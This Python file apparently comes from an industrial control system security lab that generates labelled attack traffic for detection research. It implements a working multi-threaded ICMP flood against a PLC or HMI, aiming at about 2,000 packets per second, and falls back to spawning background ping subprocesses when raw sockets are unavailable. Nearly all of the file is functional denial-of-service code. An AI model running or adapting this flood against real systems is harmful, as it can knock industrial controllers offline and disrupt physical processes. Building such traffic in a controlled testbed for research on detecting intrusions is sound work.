"""
Attack #1: ICMP Flood (Denial of Service)
==================================================================
Overwhelms the PLC/HMI with ICMP echo requests, delaying Modbus responses.
Effect: PLC network stack stays busy, misses Modbus polling cycles, causing data loss.

Packet rate targets (reference):
  - Strong ICMP flood: 1,000-5,000 pkt/s
  - Load spread across multiple threads
  - Variable payload size (realistic attack profile)

MITRE ATT&CK for ICS: T0814 - Denial of Service
Zeek signature: icmp.log -> icmp_type, id.orig_h, id.resp_h, ts
"""

import time
import sys
import os
import socket
import struct
import random
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, MODBUS_PORT, DEFAULT_NET_DURATION,
    LABEL_ICMP_FLOOD, NET_DURATIONS
)

ATTACK_NAME = "ICMP_Flood"
ATTACK_ID   = LABEL_ICMP_FLOOD

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
# Target: ~2000 pkt/s (500 pkt/s per thread x 4 threads)
THREAD_COUNT  = 4         # Number of parallel flood threads
PKT_PER_SEC   = 500       # Target packets/sec per thread
THREAD_SLEEP  = 1.0 / PKT_PER_SEC  # ~0.002s
# Mix payload sizes: small, medium, large packets (realistic)
PAYLOAD_SIZES = [64, 128, 338, 512, 1024, 1472]  # 1472 = MTU limit


def _checksum(data: bytes) -> int:
    """Compute the ICMP checksum."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_icmp_packet(seq: int, payload_size: int) -> bytes:
    """Build an ICMP Echo Request packet."""
    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_id   = os.getpid() & 0xFFFF
    payload   = random.randbytes(payload_size)
    header    = struct.pack('bbHHh', icmp_type, icmp_code, 0, icmp_id, seq)
    chk       = _checksum(header + payload)
    header    = struct.pack('bbHHh', icmp_type, icmp_code, chk, icmp_id, seq)
    return header + payload


def _flood_worker(target_ip: str, duration_sec: float,
                  counter: list, stop_event: threading.Event,
                  thread_id: int):
    """Each thread runs this function - ICMP flood via raw socket."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(0.5)
        use_raw = True
    except PermissionError:
        use_raw = False
        sock = None

    seq = thread_id * 10000   # Distinct seq range per thread
    start = time.time()

    while not stop_event.is_set() and (time.time() - start) < duration_sec:
        payload_size = random.choice(PAYLOAD_SIZES)
        try:
            if use_raw:
                pkt = _build_icmp_packet(seq & 0xFFFF, payload_size)
                sock.sendto(pkt, (target_ip, 0))
                counter[0] += 1
            else:
                # No root: fall back to fast ping subprocess (Linux)
                os.system(f"ping -c 1 -s {payload_size} -W 0 {target_ip} > /dev/null 2>&1 &")
                counter[0] += 1
        except Exception:
            pass
        seq += 1
        time.sleep(THREAD_SLEEP)

    if sock:
        try:
            sock.close()
        except Exception:
            pass


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    """
    Multi-threaded ICMP flood.
    Root/admin privileges -> raw socket (genuine ICMP echo request).
    No root -> subprocess ping (slower, for testing only).
    """
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("icmp_flood", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    total_target_pps = THREAD_COUNT * PKT_PER_SEC

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target   : {target_ip}")
    print(f"  Threads  : {THREAD_COUNT} x {PKT_PER_SEC} pkt/s = ~{total_target_pps} pkt/s")
    print(f"  Payload  : variable {PAYLOAD_SIZES[0]}-{PAYLOAD_SIZES[-1]} bytes")
    print(f"  Duration : {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"ICMP flood -> {target_ip}, ~{total_target_pps} pkt/s, {THREAD_COUNT} threads"
        )

    counter    = [0]
    stop_event = threading.Event()
    threads    = []

    for i in range(THREAD_COUNT):
        t = threading.Thread(
            target=_flood_worker,
            args=(target_ip, duration_sec, counter, stop_event, i),
            daemon=True
        )
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while (time.time() - start_time) < duration_sec:
            elapsed = time.time() - start_time
            rem     = duration_sec - elapsed
            pps     = counter[0] / max(elapsed, 0.1)
            print(f"  [ICMP] {counter[0]:,} pkt | {pps:.0f} pkt/s | remaining: {rem:.0f}s")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n  [ICMP] Manual stop!")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        pps     = counter[0] / max(elapsed, 0.1)
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{counter[0]:,} packets, {elapsed:.1f}s, {pps:.0f} pkt/s"
            )
        print(f"\n  [ICMP] {counter[0]:,} packets | {pps:.0f} pkt/s | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=30)
